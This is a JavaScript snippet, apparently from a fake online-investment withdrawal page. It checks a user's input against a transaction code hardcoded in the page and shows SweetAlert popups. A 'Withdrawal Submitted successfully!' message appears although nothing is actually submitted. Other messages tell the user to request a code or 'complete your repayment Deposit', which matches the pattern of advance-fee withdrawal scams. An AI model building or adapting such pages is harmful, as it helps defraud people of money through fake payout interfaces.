    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script>
        const code = document.getElementById("code");
        const btn = document.getElementById("btn");
        // let address = "saleemtrd@gmail.com";
        let setCode = 667503;


        btn.addEventListener("click", (e) => {
            e.preventDefault();

            if (code.value == setCode) {
                swal("", "Withdrawal Submitted successfully!", "success");

            } else if (code.value == "") {
                swal("", "Kindly request for Transaction code!", "error");

            } else if (code.value != "") {
                swal("", "Not a valid Transaction Code!", "error");

            } else {
                swal("", "Kindly complete your repayment Deposit!", "error");
            }
            code.value = "";


        });       
    </script>
